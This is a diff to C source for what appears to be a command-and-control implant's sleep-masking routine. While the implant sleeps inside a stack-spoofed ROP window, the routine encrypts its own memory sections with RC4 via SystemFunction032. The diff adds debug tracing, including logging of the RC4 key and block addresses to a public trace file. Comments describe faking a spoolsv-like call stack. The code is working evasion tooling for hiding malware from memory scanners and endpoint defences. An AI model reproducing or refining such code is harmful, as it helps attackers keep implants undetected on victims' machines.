@@ -31,32 +31,123 @@ typedef struct _G3_USTRING {
 
 typedef LONG(NTAPI *G3_SF032)(G3_USTRING * data, G3_USTRING * key); /* advapi32 SystemFunction032 = RtlEncryptDecryptRC4, returns NTSTATUS (LONG) */
 
+/* ---- temporary bisect probe (remove after diagnosis) ----
+ *
+ * Round 12 root cause: g3_log("ROP window served") ran BETWEEN mask and
+ * unmask, so its CreateFileA went through the .rdata IAT - ciphertext.
+ * RVA proof: crash insn 0x150CA -> thunk slot 0x312F0 = kernel32!
+ * CreateFileA, the only CreateFileA caller in the image is g3_log.
+ * Fix: every file op used anywhere inside the window goes through G3_IO -
+ * kernel32 pointers + path copied ONCE at init, carried on the stack via
+ * G3_MASKCTX. g3_log (string form) stays for outside-window lines and
+ * falls back to direct calls when init has not populated the cache. */
 
-/* ---- temporary bisect probe (remove after diagnosis) ---- */
+typedef struct {
+	HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
+	BOOL   (WINAPI *pWriteFile)(HANDLE, const void *, DWORD, DWORD *, void *);
+	BOOL   (WINAPI *pCloseHandle)(HANDLE);
+	char   path[64];
+	int    ok;
+} G3_IO;
+
+static G3_IO g_io;
+
 void g3_log(const char * msg, long v)
 {
-	HANDLE f = CreateFileA("C:\\Users\\Public\\gen3_trace.txt", FILE_APPEND_DATA, 0, NULL,
-	                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	/* only ever called outside the masked window - reading the g_io copy
+	 * of .data and any CRT/IAT route is fine here */
+	HANDLE f;
 	char buf[96];
+	int i = 0;
+	const char * p = msg;
+
+	if (g_io.ok)
+		f = g_io.pCreateFileA(g_io.path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+		                      OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	else
+		f = CreateFileA("C:\\Users\\Public\\gen3_trace.txt", FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+		                OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (f == INVALID_HANDLE_VALUE)
 		return;
-	{
-		int i = 0;
-		const char * p = msg;
-		while (*p && i < 70) buf[i++] = *p++;
-		if (v != 0x7fffffff) {
-			char num[16];
-			int n = 0;
-			long t = v;
-			if (t < 0) { buf[i++] = '-'; t = -t; }
-			do { num[n++] = (char)('0' + (t % 10)); t /= 10; } while (t);
-			while (n && i < 90) buf[i++] = num[--n];
-		}
-		buf[i++] = '\r';
-		buf[i++] = '\n';
-		WriteFile(f, buf, (DWORD)i, NULL, NULL);
+	while (*p && i < 70) buf[i++] = *p++;
+	if (v != 0x7fffffff) {
+		char num[16];
+		int n = 0;
+		long t = v;
+		if (t < 0) { buf[i++] = '-'; t = -t; }
+		do { num[n++] = (char)('0' + (t % 10)); t /= 10; } while (t);
+		while (n && i < 90) buf[i++] = num[--n];
 	}
-	CloseHandle(f);
+	buf[i++] = '\r';
+	buf[i++] = '\n';
+	if (g_io.ok) {
+		g_io.pWriteFile(f, buf, (DWORD)i, NULL, NULL);
+		g_io.pCloseHandle(f);
+	}
+	else {
+		WriteFile(f, buf, (DWORD)i, NULL, NULL);
+		CloseHandle(f);
+	}
+}
+
+/* Numeric tracing for the masked span: line is built purely on this stack
+ * frame (no .rdata literals), file ops come from the caller's G3_IO copy
+ * (stack), so nothing here touches beacon .data/.rdata while they are
+ * ciphertext. Format: "<tag> <a-decimal> <b-hex16> <c-hex16>". */
+static void g3_log_n(const G3_IO * io, char tag, unsigned int a, unsigned long long b, unsigned long long c)
+{
+	char buf[64];
+	int i = 0;
+	unsigned long long vals[2];
+	int f2, s;
+	HANDLE f;
+
+	if (io == NULL || !io->ok)
+		return;
+	buf[i++] = tag;
+	buf[i++] = ' ';
+	{
+		char num[12];
+		int n = 0;
+		unsigned int t = a;
+		if (t == 0)
+			num[n++] = '0';
+		while (t) {
+			num[n++] = (char)('0' + (t % 10));
+			t /= 10;
+		}
+		while (n && i < 40) buf[i++] = num[--n];
+	}
+	vals[0] = b;
+	vals[1] = c;
+	for (f2 = 0; f2 < 2; f2++) {
+		buf[i++] = ' ';
+		for (s = 60; s >= 0; s -= 4) {
+			unsigned int nib = (unsigned int)((vals[f2] >> s) & 0xf);
+			buf[i++] = (char)(nib < 10 ? ('0' + nib) : ('A' + nib - 10));
+		}
+	}
+	buf[i++] = '\r';
+	buf[i++] = '\n';
+	f = io->pCreateFileA(io->path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+	                     OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (f == INVALID_HANDLE_VALUE)
+		return;
+	io->pWriteFile(f, buf, (DWORD)i, NULL, NULL);
+	io->pCloseHandle(f);
+}
+
+/* FNV-1a over a block: pure arithmetic over the block bytes, legal to run
+ * on plaintext (before mask), ciphertext (inside window) and restored
+ * plaintext (after unmask) alike. */
+static unsigned long long g3_chk(const unsigned char * p, unsigned long len)
+{
+	unsigned long long h = 0xcbf29ce484222325ULL;
+	while (len--) {
+		h ^= (unsigned long long)*p++;
+		h *= 0x100000001b3ULL;
+	}
+	return h;
 }
 
 static G3_SF032 g_sf032;
@@ -64,13 +155,17 @@ static G3_SF032 g_sf032;
 /* RC4 is a stream cipher: running it twice with the same key restores the
  * plaintext, so one routine serves as both encrypt and decrypt. Each block
  * derives its own key (16B key XOR'd with the block counter) so two blocks
- * never share a keystream. */
-static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const unsigned char key[16], unsigned int ctr)
+ * never share a keystream. No CRT calls in here on purpose: the loop body
+ * runs while .rdata (IAT) is ciphertext (the 16B copies inline today, but
+ * explicit loops keep that true under any optimizer). */
+static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const unsigned char * key, unsigned int ctr)
 {
 	unsigned char k[16];
 	G3_USTRING d, kk;
+	int j;
 
-	memcpy(k, key, 16);
+	for (j = 0; j < 16; j++)
+		k[j] = key[j];
 	k[0] ^= (unsigned char)ctr;
 	k[1] ^= (unsigned char)(ctr >> 8);
 	kk.Buffer = k;
@@ -80,7 +175,8 @@ static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const un
 	d.Length = d.MaximumLength = len;
 
 	fn(&d, &kk);
-	memset(k, 0, 16);
+	for (j = 0; j < 16; j++)
+		k[j] = 0;
 }
 
 /* Snapshot of the block list, taken before any region is touched: masking
@@ -314,6 +410,23 @@ static BOOL g3_init(void)
 	g_lookup = (G3_LOOKUP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlLookupFunctionEntry");
 	if (g_lookup == NULL) { g3_log("init: no RtlLookupFunctionEntry", 0); return FALSE; }
 
+	/* trace IO cache - filled once, used by every logger (also inside the
+	 * masked window, via the G3_MASKCTX copy) */
+	{
+		HMODULE k32 = GetModuleHandleA("kernel32.dll");
+		const char * src = "C:\\Users\\Public\\gen3_trace.txt";
+		char * dst = g_io.path;
+		g_io.pCreateFileA = (HANDLE (WINAPI *)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE))
+			GetProcAddress(k32, "CreateFileA");
+		g_io.pWriteFile = (BOOL (WINAPI *)(HANDLE, const void *, DWORD, DWORD *, void *))
+			GetProcAddress(k32, "WriteFile");
+		g_io.pCloseHandle = (BOOL (WINAPI *)(HANDLE))GetProcAddress(k32, "CloseHandle");
+		while (*src && (dst - g_io.path) < 60)
+			*dst++ = *src++;
+		*dst = 0;
+		g_io.ok = (g_io.pCreateFileA != NULL && g_io.pWriteFile != NULL && g_io.pCloseHandle != NULL && g_sf032 != NULL);
+	}
+
 	/* resolve every frame's return address; localspl is not loaded in the
 	 * average carrier process, so pull it in once (the module-load event
 	 * is the accepted cost of the official spoolsv shape) */
@@ -488,28 +601,23 @@ typedef struct {
 	int nblocks;
 	unsigned char key[16];
 	G3_SF032 fn; /* cached pre-mask: .data (holding g_sf032) is ciphertext until unmask completes */
+	G3_IO io;    /* cached pre-mask: trace file ops must not go through the IAT */
 } G3_MASKCTX;
 
 static void g3_mask_all_cb(void * vctx)
 {
 	G3_MASKCTX * m = (G3_MASKCTX *)vctx;
-	/* g_sf032 lives in .data - once a masked block covers .data the static
-	 * would read back as ciphertext and the next call jumps to garbage.
-	 * Everything the loop touches must be stack/frame-local from here on. */
-	G3_SF032 fn = g_sf032;
-	G3_BLOCK blk;
-	unsigned char key[16];
-	int i, n;
+	/* Everything this loop touches is stack (ctx) or register: fn/key from
+	 * m, block list from m->blocks (caller's stack array), tracing through
+	 * m->io. g_sf032/.data is ciphertext once a block covers it - never
+	 * read it from here. */
+	int i, n = m->nblocks;
 
-	memcpy(key, m->key, 16);
-	n = m->nblocks;
-	/* blocks[] is the caller's stack array - frame-escape safe: the caller
-	 * (gen3_sleep) is blocked in its own wait below us on the same stack */
 	for (i = 0; i < n; i++) {
-		blk.ptr = m->blocks[i].ptr;
-		blk.len = m->blocks[i].len;
-		g3_rc4(fn, blk.ptr, blk.len, key, (unsigned int)i);
+		g3_rc4(m->fn, m->blocks[i].ptr, m->blocks[i].len, m->key, (unsigned int)i);
+		g3_log_n(&m->io, 'm', (unsigned int)i, g3_chk(m->blocks[i].ptr, m->blocks[i].len), 0);
 	}
+	g3_log_n(&m->io, 'x', 0, 0, 0);
 }
 
 BOOL gen3_sleep(DWORD time)
@@ -544,24 +652,51 @@ BOOL gen3_sleep(DWORD time)
 
 	mctx.blocks = blocks;
 	mctx.nblocks = nblocks;
-	memcpy(mctx.key, key, 16);
+	for (i = 0; i < 16; i++)
+		mctx.key[i] = key[i];
 	mctx.fn = g_sf032;
+	mctx.io = g_io; /* struct copy pre-mask; the window uses only this copy */
+
+	/* block map + plaintext checksums (C is what every later phase must
+	 * reproduce: 'm' must differ, 'U' must equal 'C') */
+	for (i = 0; i < nblocks; i++) {
+		g3_log_n(&mctx.io, 'B', (unsigned int)i, (unsigned long long)(size_t)blocks[i].ptr, blocks[i].len);
+		g3_log_n(&mctx.io, 'C', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
+	}
+	{
+		unsigned long long k0 = 0, k1 = 0;
+		for (i = 0; i < 8; i++) {
+			k0 |= ((unsigned long long)key[i]) << (8 * i);
+			k1 |= ((unsigned long long)key[8 + i]) << (8 * i);
+		}
+		g3_log_n(&mctx.io, 'K', 0, k0, k1);
+		g3_log_n(&mctx.io, 'F', 0, (unsigned long long)(size_t)mctx.fn, (unsigned long long)nblocks);
+	}
 
 	if (!g3_stack_spoof_sleep(time, g3_mask_all_cb, &mctx)) {
 		g3_log("sleep: window failed -> fallback", 0x7fffffff);
 		return FALSE;
 	}
-	g3_log("sleep: ROP window served", 0x7fffffff);
+	/* still masked here - pointer-ized line only (round 12 fix) */
+	g3_log_n(&mctx.io, 'w', 0, 0, 0);
 
 	/* RC4 twice with the same key restores the plaintext. The fn pointer
 	 * MUST come from the pre-mask cache: reading g_sf032 now would load
-	 * ciphertext (it lives in .data, still masked at this point). */
-	for (i = 0; i < nblocks; i++)
+	 * ciphertext (it lives in .data, still masked at this point). The
+	 * per-block 'u'/'U' lines make the round trip auditable: u == m,
+	 * U == C for every block. */
+	for (i = 0; i < nblocks; i++) {
+		g3_log_n(&mctx.io, 'u', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
 		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
-	g3_log("sleep: unmasked", 0x7fffffff);
+		g3_log_n(&mctx.io, 'U', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
+	}
+	g3_log_n(&mctx.io, 'D', 0, 0, 0);
 
-	memset(key, 0, sizeof(key));
-	memset(&mctx, 0, sizeof(mctx));
+	/* post-unmask: everything is plaintext again, plain loops still */
+	for (i = 0; i < 16; i++)
+		key[i] = 0;
+	for (i = 0; i < (int)sizeof(mctx); i++)
+		((unsigned char *)&mctx)[i] = 0;
 	return TRUE;
 }
 
